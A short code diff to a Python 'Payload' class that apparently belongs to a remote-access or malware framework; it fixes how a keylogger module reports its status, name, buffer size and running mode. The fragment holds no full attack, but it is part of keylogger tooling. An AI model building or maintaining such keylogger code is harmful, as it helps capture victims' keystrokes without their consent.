@@ -828,7 +828,7 @@ class Payload():
                     mode= 'running'
                 update  = status(float(self.handlers.get('keylogger').name))
                 length  = globals()['keylogger']._buffer.tell()
-                return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(func_name, mode, update, length)
+                return "Status\n\tname: keylogger\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(mode, update, length)
             except Exception as e:
                 log("{} error: {}".format('keylogger.status', str(e)))
         if 'keylogger' not in globals():
